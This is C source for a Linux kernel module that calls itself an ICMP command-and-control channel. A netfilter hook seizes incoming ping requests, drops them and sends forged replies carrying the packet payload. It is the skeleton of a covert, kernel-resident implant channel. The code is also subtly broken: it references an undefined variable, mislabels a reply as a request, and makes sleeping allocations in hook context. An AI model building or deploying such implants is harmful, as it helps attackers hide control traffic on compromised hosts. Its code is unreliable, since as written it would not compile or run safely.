#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/ktime.h>
#include <linux/jiffies.h>
#include <linux/uaccess.h>
#include <linux/inet.h>
#include <linux/skbuff.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/if_ether.h>
#include <net/ip.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("jackdunf@buffalo.edu");
MODULE_DESCRIPTION("Simple ICMP-c2");

#define ICMP_ECHO   8
#define ICMP_REPLY  0
#define ICMP_HLEN   sizeof(struct icmphdr)

static struct socket *raw_socket;
static struct nf_hook_ops nfho;
unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
static uint16_t checksum(uint16_t *data, int len);
static int send_icmp_echo_request(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);
// Source: elsewhere
static uint16_t checksum(uint16_t *data, int len) {
    uint32_t sum = 0;
    while (len > 1) { sum += *data++; len -= 2; }
    if (len == 1) sum += *(uint8_t *)data;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)~sum;
}

// Source: jackdunf, different file
static int send_icmp_echo_request(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len) {
    struct sockaddr_in dest_addr;
    struct msghdr msg = {};
    struct kvec iov;
    char *packet;
    struct icmphdr *icmp_hdr;
    int ret = 0;
    const size_t PACKET_SIZE = ICMP_HLEN + payload_len;

    // Allocate memory for the packet
    packet = kmalloc(PACKET_SIZE, GFP_KERNEL);
    if (!packet)
        return -ENOMEM;

    // Fill ICMP header
    icmp_hdr = (struct icmphdr *)packet;
    icmp_hdr->type = ICMP_REPLY;
    icmp_hdr->code = 0;
    icmp_hdr->checksum = 0;
    icmp_hdr->un.echo.id = incoming_icmp->un.echo.id;
    icmp_hdr->un.echo.sequence = incoming_icmp->un.echo.sequence;

    // Add payload
    memcpy(packet + ICMP_HLEN, payload, payload_len);

    // Calculate checksum
    icmp_hdr->checksum = checksum((uint16_t *)packet, PACKET_SIZE);

    // Initialize destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = address;

    // Initialize the socket
    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_ICMP, &raw_socket);
    if (ret < 0) {
        pr_err("Failed to create raw socket: %d\n", ret);
        kfree(packet);
        return ret;
    }

    // Prepare message
    iov.iov_base = packet;
    iov.iov_len = PACKET_SIZE;
    iov_iter_kvec(&msg.msg_iter, WRITE, &iov, 1, PACKET_SIZE);

    msg.msg_name = &dest_addr;
    msg.msg_namelen = sizeof(dest_addr);

    // Send the ICMP Echo Request
    ret = kernel_sendmsg(raw_socket, &msg, &iov, 1, PACKET_SIZE);
    if (ret < 0) {
        pr_err("Failed to send ICMP echo request: %d\n", ret);
    } else {
        pr_info("ICMP echo request sent successfully\n");
    }

    // Clean up
    sock_release(raw_socket);
    kfree(packet);

    return (ret >= 0) ? 0 : ret;
}


unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph;
    struct icmphdr *icmph;
    unsigned char *payload;
    int icmp_payload_len;

    // Ensure it's an IPv4 packet with ICMP
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }

    icmph = icmp_hdr(skb);
    if (!icmph || icmph->type != ICMP_ECHO) {
        return NF_ACCEPT;
    }

    // Below overestimates
    // unsigned char *end_of_skb = skb->data + skb->len; 
    // icmp_payload_len = (void *)end_of_skb - ( (void *)icmph + ICMP_HLEN );

    icmp_payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - ICMP_HLEN;
    payload = (void *)icmp_header + ICMP_HLEN;

    pr_info("icmp_payload_len: %d\n", icmp_payload_len);

    // TODO: Check if ignore all is set
    if(send_icmp_echo_request(icmph, iph->saddr, payload, icmp_payload_len) < 0){
        return NF_ACCEPT;
    }
    return NF_DROP;
}

// Module initialization
static int __init init_icmp_hijack(void) {
    printk(KERN_INFO "Loading icmp-c2 module...\n");

    // Fill in the nf_hook_ops structure
    nfho.hook = icmp_hijack;                     // Hook function
    // nfho.hooknum = NF_INET_LOCAL_IN;        // Apply to incoming packets
    nfho.hooknum = NF_INET_PRE_ROUTING;        // Going to try to manipulate
    nfho.pf = PF_INET;                          // IPv4
    nfho.priority = NF_IP_PRI_FIRST;            // Set highest priority

    // Register the hook
    nf_register_net_hook(&init_net, &nfho);
    printk(KERN_INFO "icmp-C2 loaded.\n");

    return 0;
}

// Module cleanup
static void __exit exit_icmp_hijack(void) {
    printk(KERN_INFO "Unloading icmp-c2...\n");

    // Unregister the hook
    nf_unregister_net_hook(&init_net, &nfho);
    printk(KERN_INFO "icmp-c2 unloaded.\n");
}

module_init(init_icmp_hijack);
module_exit(exit_icmp_hijack);
